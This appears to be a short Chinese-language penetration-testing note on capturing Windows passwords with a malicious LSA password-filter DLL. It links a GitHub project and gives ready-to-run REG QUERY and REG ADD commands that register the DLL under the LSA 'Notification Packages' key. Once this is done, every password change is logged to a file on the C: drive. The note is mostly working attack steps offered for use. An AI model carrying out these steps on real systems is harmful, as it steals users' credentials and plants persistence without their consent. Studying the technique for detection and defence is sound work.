	https://github.com/3gstudent/PasswordFilter
	visualstudio生成解决方案
	DLL放在%windir%\system32\下
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages，添加Win32Project3
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/521.png)

	>REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
	>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0rassfm\0Win32Project3" /f
	重启之后只要修改用户的密码，即可记录
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/522.png)

	文件默认在C盘根目录，可在源码中修改
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/523.png)